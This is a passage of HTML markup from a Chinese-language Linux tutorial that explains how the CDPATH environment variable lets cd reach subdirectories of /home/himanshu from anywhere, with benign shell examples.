class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pwd\r\n/home/himanshu/Downloads\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2c8e021472355-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2c8e021472355-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2c8e021472355-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2c8e021472355-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2c8e021472355-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Downloads</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2c8e021472355-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在要求切换至 <code>/home/himanshu/Desktop</code> 目录，我一般会这样做：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2c97912260227\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd /home/himanshu/Desktop/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2c97912260227-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2c97912260227-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2c97912260227-1\"><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2c97912260227-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2c9b694160887\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd ~/Desktop/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2c9b694160887-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2c9b694160887-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2c9b694160887-1\"><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2c9b694160887-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2c9e876558515\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd ../Desktop/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2c9e876558515-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2c9e876558515-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2c9e876558515-1\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2c9e876558515-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>能不能只是运行以下命令就能简单地实现呢：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2ca2231420615\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Desktop\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2ca2231420615-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2ca2231420615-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2ca2231420615-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">Desktop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2ca2231420615-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>是的，这完全有可能。这就是环境变量 <code>CDPATH</code> 出现的时候了。你可使用这个变量来为 <code>cd</code> 命令定义基础目录。</p>\n<p>如果你尝试打印它的值，你会看见这个环境变量默认是空值的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2ca5175701320\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ echo $CDPATH\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2ca5175701320-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2ca5175701320-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2ca5175701320-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">CDPATH</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2ca5175701320-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>现在 ，考虑到上面提到的场景，我们使用这个环境变量，将 <code>/home/himanshu</code> 作为 <code>cd</code> 命令的基础目录来使用。</p>\n<p>最简单的做法这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2ca8745545147\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nexport CDPATH=/home/himanshu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2ca8745545147-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2ca8745545147-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2ca8745545147-1\"><span class=\"crayon-e\">export </span><span class=\"crayon-v\">CDPATH</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">himanshu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2ca8745545147-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在，我能做到之前所不能做到的事了 – 当前工作目录在 <code>/home/himanshu/Downloads</code> 目录里时，成功地运行了 <code>cd Desktop</code> 命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cac177449911\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pwd\r\n/home/himanshu/Downloads\r\n$ cd Desktop/\r\n/home/himanshu/Desktop\r\n$\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cac177449911-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cac177449911-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cac177449911-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cac177449911-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cac177449911-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cac177449911-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cac177449911-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cac177449911-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Downloads</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2cac177449911-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cac177449911-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Desktop</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2cac177449911-5\"><span class=\"crayon-sy\">$</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cac177449911-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>这表明了我可以使用 <code>cd</code> 命令来到达 <code>/home/himanshu</code> 下的任意一个目录，而不需要在 <code>cd</code> 命令中显式地指定 <code>/home/himanshu</code> 或者 <code>~</code>，又或者是 <code>../</code> (或者多个 <code>../</code>)。</p>\n<h3 id=\"toc_2\">要点</h3>\n<p>现在你应该知道了怎样利用环境变量 <code>CDPATH</code> 在 <code>/home/himanshu/Downloads</code> 和 <code>/home/himanshu/Desktop</code> 之间轻松切换。现在，考虑以下这种情况， 在 <code>/home/himanshu/Desktop</code> 目录里包含一个名字叫做 <code>Downloads</code> 的子目录，这是将要切换到的目录。</p>\n<p>但突然你会意识到 <code>cd Downloads</code> 会切换到 <code>/home/himanshu/Downloads</code>。所以，为了确保这不会发生，你可以这样做：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cb0598950837\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd ./Downloads\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cb0598950837-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cb0598950837-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cb0598950837-1\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Downloads</span></div><div class=\"crayon-line crayon-striped-line\" 